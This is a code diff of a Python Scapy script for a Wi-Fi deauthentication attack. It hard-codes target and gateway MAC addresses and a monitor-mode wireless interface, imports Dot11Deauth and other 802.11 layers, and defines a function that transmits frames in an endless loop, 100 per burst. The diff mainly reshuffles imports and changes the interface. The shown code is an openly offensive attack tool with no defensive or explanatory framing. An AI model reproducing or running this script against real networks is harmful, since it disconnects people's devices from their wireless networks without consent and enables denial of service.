@@ -1,7 +1,5 @@
-from scapy.all import *
-
-target_mac = "0A:61:57:7D:FC:3F"
-gateway_mac = "0C:B9:37:85:C5:1A"
+# target_mac = "0A:61:57:7D:FC:3F"
+# gateway_mac = "0C:B9:37:85:C5:1A"
 # # 802.11 frame
 # # addr1: destination MAC
 # # addr2: source MAC
@@ -15,14 +13,16 @@ gateway_mac = "0C:B9:37:85:C5:1A"
 
 ##########################################################################################
 
-from scapy.all import *
+from scapy import *
 import shelve
 import sys
 import os
-from threading import Thread
+from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt, RadioTap, Dot11Deauth
+import threading
+from scapy.all import *
 target_mac = "5a:2e:9c:60:ba:09"
 gateway_mac = "00:16:78:11:b2:7a" # mama-ext
-interface="wlan0mon"
+interface="wlx6c5ab0b3f988"
 def for_ap(frame, interface):
   while True:
     sendp(frame, iface = interface, count = 100, inter = 0.1)
